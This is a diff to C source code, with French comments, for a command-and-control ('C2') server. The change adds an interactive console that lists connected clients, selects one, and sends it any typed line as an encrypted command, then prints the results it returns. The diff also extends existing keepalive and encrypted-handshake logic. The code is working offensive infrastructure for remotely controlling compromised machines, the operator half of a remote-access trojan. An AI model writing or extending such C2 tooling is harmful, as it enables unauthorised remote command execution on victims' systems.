@@ -17,6 +17,7 @@
 
 static volatile sig_atomic_t g_running = 1;
 static uint16_t g_seq = 0;
+static int      g_active_client = -1;   /* -1 = aucun */
 
 static void handle_sigint(int sig)
 {
@@ -34,6 +35,18 @@ static void print_usage(const char *prog)
     printf("  --help          Affiche cette aide\n");
 }
 
+static void print_help(void)
+{
+    printf("\n--- Commandes locales ---\n");
+    printf("  /list           Liste les clients connectés\n");
+    printf("  /use <N>        Sélectionne le client N\n");
+    printf("  /kill <N>       Déconnecte le client N\n");
+    printf("  /help           Affiche cette aide\n");
+    printf("  /quit           Quitte le C2\n");
+    printf("  <autre>         Envoie la commande au client actif\n");
+    printf("-------------------------\n\n");
+}
+
 /* ============================================================
  * Keepalive
  * ============================================================ */
@@ -44,30 +57,138 @@ static void check_keepalive(fso_server_t *srv, time_t now)
         fso_client_t *c = &srv->clients[i];
         if (!c->active || !c->has_key) continue;
 
-        /* 1. Client mort ? (pas de pong depuis FSO_TIMEOUT_SEC) */
+        /* Client mort ? */
         if (c->last_pong > 0 &&
             (now - c->last_pong) >= FSO_TIMEOUT_SEC) {
             fprintf(stderr,
                     "[-] Client #%d timeout (pas de pong depuis %lds)\n",
                     i, (long)(now - c->last_pong));
             fso_server_disconnect(srv, i);
+            if (g_active_client == i) g_active_client = -1;
             continue;
         }
 
-        /* 2. Envoyer un ping si nécessaire. */
+        /* Envoyer un ping si nécessaire. */
         if (c->last_ping == 0 ||
             (now - c->last_ping) >= FSO_KEEPALIVE_SEC) {
             uint8_t ping_byte = 0x00;
             if (fso_server_send_secure(srv, i, MSG_PING, g_seq++,
                                        &ping_byte, 1) == 0) {
                 c->last_ping = now;
-                printf("[keepalive] MSG_PING envoyé au client #%d\n", i);
             } else {
                 fprintf(stderr, "[-] Envoi ping échoué, déconnexion #%d\n", i);
                 fso_server_disconnect(srv, i);
+                if (g_active_client == i) g_active_client = -1;
             }
         }
     }
+}
+
+/* ============================================================
+ * Commandes locales
+ * ============================================================ */
+
+static void cmd_list(fso_server_t *srv)
+{
+    int count = 0;
+    for (int i = 0; i < FSO_MAX_CLIENTS; i++) {
+        if (srv->clients[i].active && srv->clients[i].has_key) {
+            printf("  #%d  %s:%u%s\n", i,
+                   fso_server_client_ip(srv, i),
+                   srv->clients[i].port,
+                   (i == g_active_client) ? "  [ACTIF]" : "");
+            count++;
+        }
+    }
+    if (count == 0) {
+        printf("  Aucun client connecté.\n");
+    }
+}
+
+static int cmd_use(fso_server_t *srv, const char *arg)
+{
+    int n = atoi(arg);
+    if (n < 0 || n >= FSO_MAX_CLIENTS) {
+        printf("[-] Index invalide\n");
+        return -1;
+    }
+    if (!srv->clients[n].active || !srv->clients[n].has_key) {
+        printf("[-] Client #%d n'est pas connecté\n", n);
+        return -1;
+    }
+    g_active_client = n;
+    printf("[+] Client actif : #%d (%s)\n", n, fso_server_client_ip(srv, n));
+    return 0;
+}
+
+static void cmd_kill(fso_server_t *srv, const char *arg)
+{
+    int n = atoi(arg);
+    if (n < 0 || n >= FSO_MAX_CLIENTS) {
+        printf("[-] Index invalide\n");
+        return;
+    }
+    if (!srv->clients[n].active) {
+        printf("[-] Client #%d n'est pas connecté\n", n);
+        return;
+    }
+    fso_server_disconnect(srv, n);
+    if (g_active_client == n) g_active_client = -1;
+}
+
+/* Traite une ligne tapée par l'utilisateur. Retourne :
+ *   1  = continuer
+ *   0  = quitter */
+static int handle_stdin_line(fso_server_t *srv, char *line)
+{
+    /* Strip newline. */
+    size_t len = strlen(line);
+    while (len > 0 && (line[len-1] == '\n' || line[len-1] == '\r')) {
+        line[--len] = '\0';
+    }
+    if (len == 0) return 1;
+
+    /* Commandes locales ? */
+    if (line[0] == '/') {
+        if (strcmp(line, "/quit") == 0 || strcmp(line, "/exit") == 0) {
+            return 0;
+        }
+        if (strcmp(line, "/help") == 0) {
+            print_help();
+            return 1;
+        }
+        if (strcmp(line, "/list") == 0) {
+            cmd_list(srv);
+            return 1;
+        }
+        if (strncmp(line, "/use ", 5) == 0) {
+            cmd_use(srv, line + 5);
+            return 1;
+        }
+        if (strncmp(line, "/kill ", 6) == 0) {
+            cmd_kill(srv, line + 6);
+            return 1;
+        }
+        printf("[-] Commande inconnue : %s\n", line);
+        print_help();
+        return 1;
+    }
+
+    /* Sinon : envoyer au client actif. */
+    if (g_active_client < 0 ||
+        !srv->clients[g_active_client].active ||
+        !srv->clients[g_active_client].has_key) {
+        printf("[-] Aucun client actif. Utilisez /list puis /use N\n");
+        return 1;
+    }
+
+    printf("[>] Envoi de %zu octets au client #%d\n", len, g_active_client);
+    if (fso_server_send_secure(srv, g_active_client, MSG_CMD, g_seq++,
+                               (const uint8_t *)line,
+                               (uint32_t)len) < 0) {
+        fprintf(stderr, "[-] Envoi échoué\n");
+    }
+    return 1;
 }
 
 /* ============================================================
@@ -76,14 +197,18 @@ static void check_keepalive(fso_server_t *srv, time_t now)
 
 static int run_server(fso_server_t *srv)
 {
-    printf("[+] C2 démarré. Ctrl+C pour quitter.\n\n");
+    printf("[+] C2 démarré. Tapez /help pour l'aide.\n\n");
+    printf("c2> ");
+    fflush(stdout);
 
     while (g_running) {
         fd_set readfds;
         FD_ZERO(&readfds);
 
         FD_SET(srv->listen_fd, &readfds);
+        FD_SET(STDIN_FILENO, &readfds);
         int maxfd = srv->listen_fd;
+        if (STDIN_FILENO > maxfd) maxfd = STDIN_FILENO;
 
         for (int i = 0; i < FSO_MAX_CLIENTS; i++) {
             if (srv->clients[i].active) {
@@ -106,13 +231,26 @@ static int run_server(fso_server_t *srv)
         }
 
         time_t now = time(NULL);
-
-        /* Tick keepalive : à chaque tour (même si ret == 0). */
         check_keepalive(srv, now);
 
-        if (ret == 0) continue; /* timeout, on a déjà fait le keepalive */
+        if (ret == 0) continue;
 
-        /* Nouvelle connexion ? */
+        /* ---------- STDIN ---------- */
+        if (FD_ISSET(STDIN_FILENO, &readfds)) {
+            char line[1024];
+            if (fgets(line, sizeof(line), stdin) == NULL) {
+                /* EOF : Ctrl+D */
+                printf("\n[+] EOF sur stdin, arrêt.\n");
+                break;
+            }
+            if (handle_stdin_line(srv, line) == 0) {
+                break;
+            }
+            printf("c2> ");
+            fflush(stdout);
+        }
+
+        /* ---------- Nouvelle connexion ---------- */
         if (FD_ISSET(srv->listen_fd, &readfds)) {
             int idx = fso_server_accept(srv);
             if (idx >= 0) {
@@ -121,29 +259,26 @@ static int run_server(fso_server_t *srv)
                     fprintf(stderr, "[-] Handshake échoué pour client #%d\n", idx);
                     fso_server_disconnect(srv, idx);
                 } else {
-                    printf("[+] Client #%d : session chiffrée établie\n", idx);
+                    printf("\n[+] Client #%d : session chiffrée établie\n", idx);
 
                     memcpy(srv->clients[idx].aes_key, aes_key, FSO_KEY_SIZE);
                     srv->clients[idx].has_key = 1;
-
-                    /* Init timestamps keepalive. */
                     srv->clients[idx].last_ping = now;
                     srv->clients[idx].last_pong = now;
 
-                    /* Test : envoyer un message chiffré. */
-                    const char *msg = "hello from C2 (chiffré)";
-                    if (fso_server_send_secure(srv, idx, MSG_CMD, g_seq++,
-                                                (const uint8_t *)msg,
-                                                (uint32_t)strlen(msg)) == 0) {
-                        printf("[+] Message chiffré envoyé au client #%d\n", idx);
-                    } else {
-                        fprintf(stderr, "[-] Envoi chiffré échoué\n");
+                    /* Premier client : devient actif automatiquement. */
+                    if (g_active_client < 0) {
+                        g_active_client = idx;
+                        printf("[+] Client #%d devient le client actif\n", idx);
                     }
+
+                    printf("c2> ");
+                    fflush(stdout);
                 }
             }
         }
 
-        /* Données entrantes sur un client ? */
+        /* ---------- Données entrantes d'un client ---------- */
         for (int i = 0; i < FSO_MAX_CLIENTS; i++) {
             if (!srv->clients[i].active) continue;
             if (!srv->clients[i].has_key) continue;
@@ -156,23 +291,36 @@ static int run_server(fso_server_t *srv)
                                            payload, sizeof(payload));
             if (n < 0) {
                 fso_server_disconnect(srv, i);
+                if (g_active_client == i) g_active_client = -1;
                 continue;
             }
 
-            /* Réponse au ping ? */
-            if (header.type == MSG_PONG) {
+            switch (header.type) {
+
+            case MSG_PONG:
                 srv->clients[i].last_pong = now;
-                printf("[keepalive] MSG_PONG reçu du client #%d\n", i);
-                continue;
-            }
+                break;
 
-            /* Autre message : affichage brut. */
-            printf("[client #%d] type=0x%02X seq=%u, %d octets\n",
-                   i, header.type, header.seq_id, n);
+            case MSG_RESULT:
+                printf("\n[client #%d] résultat (%d octets) :\n", i, n);
+                if (n > 0) {
+                    fwrite(payload, 1, (size_t)n, stdout);
+                    if (payload[n-1] != '\n') printf("\n");
+                }
+                printf("c2> ");
+                fflush(stdout);
+                break;
 
-            if (n > 0) {
-                fwrite(payload, 1, (size_t)n, stdout);
-                printf("\n");
+            default:
+                printf("\n[client #%d] type=0x%02X, %d octets\n",
+                       i, header.type, n);
+                if (n > 0) {
+                    fwrite(payload, 1, (size_t)n, stdout);
+                    printf("\n");
+                }
+                printf("c2> ");
+                fflush(stdout);
+                break;
             }
         }
     }
@@ -216,6 +364,5 @@ int main(int argc, char **argv)
     int ret = run_server(&srv);
 
     fso_server_close(&srv);
-
     return ret == 0 ? 0 : 1;
 }
